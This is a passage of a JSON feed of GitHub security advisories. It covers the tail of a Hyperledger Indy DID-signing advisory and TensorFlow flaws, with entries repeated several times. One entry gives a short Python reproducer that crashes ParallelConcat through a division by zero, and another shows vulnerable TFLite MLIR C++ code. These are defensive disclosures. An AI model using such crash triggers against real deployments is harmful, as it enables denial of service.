id=\"uninstallation-of-the-environment\">Uninstallation of the environment</h3>\n<p>Suppress the container <code>test</code> and remove the image <code>test</code></p>\n<pre><code>./uninstall.sh\n</code></pre>\n<h1 id=\"analysis\">Analysis</h1>\n<p>We are grateful to @alexandredeleze for discovering and responsibly disclosing the issue.</p>\n<p>We were previously aware that any DID on the ledger can \"update\" the state (seqNo + txnTime) if it doesn't change the state data itself. We considered this a minor bug because only the seqNo and txnTime changed. But seeing that this can also affect the \"parent\" DID means that it has a higher severity.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/hyperledger/indy-node/security/advisories/GHSA-wh2w-39f4-rpv2\">https://github.com/hyperledger/indy-node/security/advisories/GHSA-wh2w-39f4-rpv2</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-11093\">https://nvd.nist.gov/vuln/detail/CVE-2020-11093</a></li>\n<li><a href=\"https://github.com/hyperledger/indy-node/commit/55056f22c83b7c3520488b615e1577e0f895d75a\">https://github.com/hyperledger/indy-node/commit/55056f22c83b7c3520488b615e1577e0f895d75a</a></li>\n<li><a href=\"https://github.com/hyperledger/indy-node/blob/master/CHANGELOG.md#1124\">https://github.com/hyperledger/indy-node/blob/master/CHANGELOG.md#1124</a></li>\n<li><a href=\"https://github.com/hyperledger/indy-node/blob/master/docs/source/auth_rules.md\">https://github.com/hyperledger/indy-node/blob/master/docs/source/auth_rules.md</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/indy-node/PYSEC-2020-48.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/indy-node/PYSEC-2020-48.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wh2w-39f4-rpv2\">https://github.com/advisories/GHSA-wh2w-39f4-rpv2</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wh2w-39f4-rpv2",
            "title": "[indy-node] Hyperledger Indy's update process of a DID does not check who signs the request",
            "date_modified": "2024-08-30T18:41:17.000Z",
            "date_published": "2024-08-30T18:41:16.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wh2w-39f4-rpv2"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/inplace_ops.cc#L72-L97\">implementation of <code>ParallelConcat</code></a> misses some input validation and can produce a division by 0:</p>\n<pre><code class=\"language-python\">import tensorflow as tf\n\n@tf.function\ndef test():\n  y = tf.raw_ops.ParallelConcat(values=[['tf']],shape=0)\n  return y\n\ntest()\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235\">f2c3931113eaafe9ef558faaddd48e00a6606235</a>.</p>\n<p>The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by members of the Aivul Team from Qihoo 360.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7v94-64hj-m82h\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7v94-64hj-m82h</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41207\">https://nvd.nist.gov/vuln/detail/CVE-2021-41207</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235\">https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/9de11bdc2cf1284b2f635419bd3e6bbc7643eb2c\">https://github.com/tensorflow/tensorflow/commit/9de11bdc2cf1284b2f635419bd3e6bbc7643eb2c</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/d11f21bbdfa54f3576ae860fc927bf23c675ebc0\">https://github.com/tensorflow/tensorflow/commit/d11f21bbdfa54f3576ae860fc927bf23c675ebc0</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/e67caccea81167402c62977b5c521f2a8b261d6a\">https://github.com/tensorflow/tensorflow/commit/e67caccea81167402c62977b5c521f2a8b261d6a</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/inplace_ops.cc#L72-L97\">https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/inplace_ops.cc#L72-L97</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7v94-64hj-m82h\">https://github.com/advisories/GHSA-7v94-64hj-m82h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7v94-64hj-m82h",
            "title": "[tensorflow] FPE in `ParallelConcat`",
            "date_modified": "2024-08-29T22:09:53.000Z",
            "date_published": "2021-11-10T19:02:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7v94-64hj-m82h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/inplace_ops.cc#L72-L97\">implementation of <code>ParallelConcat</code></a> misses some input validation and can produce a division by 0:</p>\n<pre><code class=\"language-python\">import tensorflow as tf\n\n@tf.function\ndef test():\n  y = tf.raw_ops.ParallelConcat(values=[['tf']],shape=0)\n  return y\n\ntest()\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235\">f2c3931113eaafe9ef558faaddd48e00a6606235</a>.</p>\n<p>The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by members of the Aivul Team from Qihoo 360.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7v94-64hj-m82h\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7v94-64hj-m82h</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41207\">https://nvd.nist.gov/vuln/detail/CVE-2021-41207</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235\">https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/9de11bdc2cf1284b2f635419bd3e6bbc7643eb2c\">https://github.com/tensorflow/tensorflow/commit/9de11bdc2cf1284b2f635419bd3e6bbc7643eb2c</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/d11f21bbdfa54f3576ae860fc927bf23c675ebc0\">https://github.com/tensorflow/tensorflow/commit/d11f21bbdfa54f3576ae860fc927bf23c675ebc0</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/e67caccea81167402c62977b5c521f2a8b261d6a\">https://github.com/tensorflow/tensorflow/commit/e67caccea81167402c62977b5c521f2a8b261d6a</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/inplace_ops.cc#L72-L97\">https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/inplace_ops.cc#L72-L97</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7v94-64hj-m82h\">https://github.com/advisories/GHSA-7v94-64hj-m82h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7v94-64hj-m82h",
            "title": "[tensorflow] FPE in `ParallelConcat`",
            "date_modified": "2024-08-29T22:09:53.000Z",
            "date_published": "2021-11-10T19:02:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7v94-64hj-m82h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>The <a href=\"https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/inplace_ops.cc#L72-L97\">implementation of <code>ParallelConcat</code></a> misses some input validation and can produce a division by 0:</p>\n<pre><code class=\"language-python\">import tensorflow as tf\n\n@tf.function\ndef test():\n  y = tf.raw_ops.ParallelConcat(values=[['tf']],shape=0)\n  return y\n\ntest()\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235\">f2c3931113eaafe9ef558faaddd48e00a6606235</a>.</p>\n<p>The fix will be included in TensorFlow 2.7.0. We will also cherrypick this commit on TensorFlow 2.6.1, TensorFlow 2.5.2, and TensorFlow 2.4.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by members of the Aivul Team from Qihoo 360.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7v94-64hj-m82h\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-7v94-64hj-m82h</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-41207\">https://nvd.nist.gov/vuln/detail/CVE-2021-41207</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235\">https://github.com/tensorflow/tensorflow/commit/f2c3931113eaafe9ef558faaddd48e00a6606235</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/9de11bdc2cf1284b2f635419bd3e6bbc7643eb2c\">https://github.com/tensorflow/tensorflow/commit/9de11bdc2cf1284b2f635419bd3e6bbc7643eb2c</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/d11f21bbdfa54f3576ae860fc927bf23c675ebc0\">https://github.com/tensorflow/tensorflow/commit/d11f21bbdfa54f3576ae860fc927bf23c675ebc0</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/e67caccea81167402c62977b5c521f2a8b261d6a\">https://github.com/tensorflow/tensorflow/commit/e67caccea81167402c62977b5c521f2a8b261d6a</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/inplace_ops.cc#L72-L97\">https://github.com/tensorflow/tensorflow/blob/8d72537c6abf5a44103b57b9c2e22c14f5f49698/tensorflow/core/kernels/inplace_ops.cc#L72-L97</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-7v94-64hj-m82h\">https://github.com/advisories/GHSA-7v94-64hj-m82h</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-7v94-64hj-m82h",
            "title": "[tensorflow] FPE in `ParallelConcat`",
            "date_modified": "2024-08-29T22:09:53.000Z",
            "date_published": "2021-11-10T19:02:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-7v94-64hj-m82h"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An attacker can craft a TFLite model that would trigger a null pointer dereference, which would result in a crash and denial of service:</p>\n<p>This is caused by the MLIR optimization of <code>L2NormalizeReduceAxis</code> operator. The <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70\">implementation</a> unconditionally dereferences a pointer to an iterator to a vector without checking that the vector has elements:</p>\n<pre><code class=\"language-cc\">bool L2NormalizeReduceAxis(Value sq_op, DenseElementsAttr axis) {\n  if (sq_op.getType().cast&lt;ShapedType&gt;().getRank() - 1 ==\n          *axis.getValues&lt;int&gt;().begin() ||\n      *axis.getValues&lt;int&gt;().begin() == -1) {\n      // ...\n  }\n  // ...\n}\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955\">d6b57f461b39fd1aa8c1b870f1b974aac3554955</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37689\">https://nvd.nist.gov/vuln/detail/CVE-2021-37689</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955\">https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wf5p-c75w-w3wh\">https://github.com/advisories/GHSA-wf5p-c75w-w3wh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wf5p-c75w-w3wh",
            "title": "[tensorflow-gpu] Null pointer dereference in TFLite MLIR optimizations",
            "date_modified": "2024-08-29T22:06:55.000Z",
            "date_published": "2021-08-25T14:39:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wf5p-c75w-w3wh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An attacker can craft a TFLite model that would trigger a null pointer dereference, which would result in a crash and denial of service:</p>\n<p>This is caused by the MLIR optimization of <code>L2NormalizeReduceAxis</code> operator. The <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70\">implementation</a> unconditionally dereferences a pointer to an iterator to a vector without checking that the vector has elements:</p>\n<pre><code class=\"language-cc\">bool L2NormalizeReduceAxis(Value sq_op, DenseElementsAttr axis) {\n  if (sq_op.getType().cast&lt;ShapedType&gt;().getRank() - 1 ==\n          *axis.getValues&lt;int&gt;().begin() ||\n      *axis.getValues&lt;int&gt;().begin() == -1) {\n      // ...\n  }\n  // ...\n}\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955\">d6b57f461b39fd1aa8c1b870f1b974aac3554955</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37689\">https://nvd.nist.gov/vuln/detail/CVE-2021-37689</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955\">https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wf5p-c75w-w3wh\">https://github.com/advisories/GHSA-wf5p-c75w-w3wh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wf5p-c75w-w3wh",
            "title": "[tensorflow-gpu] Null pointer dereference in TFLite MLIR optimizations",
            "date_modified": "2024-08-29T22:06:55.000Z",
            "date_published": "2021-08-25T14:39:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wf5p-c75w-w3wh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An attacker can craft a TFLite model that would trigger a null pointer dereference, which would result in a crash and denial of service:</p>\n<p>This is caused by the MLIR optimization of <code>L2NormalizeReduceAxis</code> operator. The <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70\">implementation</a> unconditionally dereferences a pointer to an iterator to a vector without checking that the vector has elements:</p>\n<pre><code class=\"language-cc\">bool L2NormalizeReduceAxis(Value sq_op, DenseElementsAttr axis) {\n  if (sq_op.getType().cast&lt;ShapedType&gt;().getRank() - 1 ==\n          *axis.getValues&lt;int&gt;().begin() ||\n      *axis.getValues&lt;int&gt;().begin() == -1) {\n      // ...\n  }\n  // ...\n}\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955\">d6b57f461b39fd1aa8c1b870f1b974aac3554955</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37689\">https://nvd.nist.gov/vuln/detail/CVE-2021-37689</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955\">https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wf5p-c75w-w3wh\">https://github.com/advisories/GHSA-wf5p-c75w-w3wh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wf5p-c75w-w3wh",
            "title": "[tensorflow-gpu] Null pointer dereference in TFLite MLIR optimizations",
            "date_modified": "2024-08-29T22:06:55.000Z",
            "date_published": "2021-08-25T14:39:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wf5p-c75w-w3wh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An attacker can craft a TFLite model that would trigger a null pointer dereference, which would result in a crash and denial of service:</p>\n<p>This is caused by the MLIR optimization of <code>L2NormalizeReduceAxis</code> operator. The <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70\">implementation</a> unconditionally dereferences a pointer to an iterator to a vector without checking that the vector has elements:</p>\n<pre><code class=\"language-cc\">bool L2NormalizeReduceAxis(Value sq_op, DenseElementsAttr axis) {\n  if (sq_op.getType().cast&lt;ShapedType&gt;().getRank() - 1 ==\n          *axis.getValues&lt;int&gt;().begin() ||\n      *axis.getValues&lt;int&gt;().begin() == -1) {\n      // ...\n  }\n  // ...\n}\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955\">d6b57f461b39fd1aa8c1b870f1b974aac3554955</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37689\">https://nvd.nist.gov/vuln/detail/CVE-2021-37689</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955\">https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wf5p-c75w-w3wh\">https://github.com/advisories/GHSA-wf5p-c75w-w3wh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wf5p-c75w-w3wh",
            "title": "[tensorflow-cpu] Null pointer dereference in TFLite MLIR optimizations",
            "date_modified": "2024-08-29T22:06:55.000Z",
            "date_published": "2021-08-25T14:39:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wf5p-c75w-w3wh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An attacker can craft a TFLite model that would trigger a null pointer dereference, which would result in a crash and denial of service:</p>\n<p>This is caused by the MLIR optimization of <code>L2NormalizeReduceAxis</code> operator. The <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70\">implementation</a> unconditionally dereferences a pointer to an iterator to a vector without checking that the vector has elements:</p>\n<pre><code class=\"language-cc\">bool L2NormalizeReduceAxis(Value sq_op, DenseElementsAttr axis) {\n  if (sq_op.getType().cast&lt;ShapedType&gt;().getRank() - 1 ==\n          *axis.getValues&lt;int&gt;().begin() ||\n      *axis.getValues&lt;int&gt;().begin() == -1) {\n      // ...\n  }\n  // ...\n}\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955\">d6b57f461b39fd1aa8c1b870f1b974aac3554955</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh\">https://github.com/tensorflow/tensorflow/security/advisories/GHSA-wf5p-c75w-w3wh</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2021-37689\">https://nvd.nist.gov/vuln/detail/CVE-2021-37689</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955\">https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955</a></li>\n<li><a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70\">https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-wf5p-c75w-w3wh\">https://github.com/advisories/GHSA-wf5p-c75w-w3wh</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-wf5p-c75w-w3wh",
            "title": "[tensorflow-cpu] Null pointer dereference in TFLite MLIR optimizations",
            "date_modified": "2024-08-29T22:06:55.000Z",
            "date_published": "2021-08-25T14:39:36.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-wf5p-c75w-w3wh"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An attacker can craft a TFLite model that would trigger a null pointer dereference, which would result in a crash and denial of service:</p>\n<p>This is caused by the MLIR optimization of <code>L2NormalizeReduceAxis</code> operator. The <a href=\"https://github.com/tensorflow/tensorflow/blob/149562d49faa709ea80df1d99fc41d005b81082a/tensorflow/compiler/mlir/lite/transforms/optimize.cc#L67-L70\">implementation</a> unconditionally dereferences a pointer to an iterator to a vector without checking that the vector has elements:</p>\n<pre><code class=\"language-cc\">bool L2NormalizeReduceAxis(Value sq_op, DenseElementsAttr axis) {\n  if (sq_op.getType().cast&lt;ShapedType&gt;().getRank() - 1 ==\n          *axis.getValues&lt;int&gt;().begin() ||\n      *axis.getValues&lt;int&gt;().begin() == -1) {\n      // ...\n  }\n  // ...\n}\n</code></pre>\n<h3 id=\"patches\">Patches</h3>\n<p>We have patched the issue in GitHub commit <a href=\"https://github.com/tensorflow/tensorflow/commit/d6b57f461b39fd1aa8c1b870f1b974aac3554955\">d6b57f461b39fd1aa8c1b870f1b974aac3554955</a>.</p>\n<p>The fix will be included in TensorFlow 2.6.0. We will also cherrypick this commit on TensorFlow 2.5.1, TensorFlow 2.4.3, and TensorFlow 2.3.4, as these are also affected and still in supported range.</p>\n<h3 id=\"for-more-information\">For more information</h3>\n<p>Please consult <a href=\"https://github.com/tensorflow/tensorflow/blob/master/SECURITY.md\">our security guide</a> for more information regarding the security model and how to contact us with issues and questions.</p>\n<h3 id=\"attribution\">Attribution</h3>\n<p>This vulnerability has been reported by Yakun Zhang of Baidu Security.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a 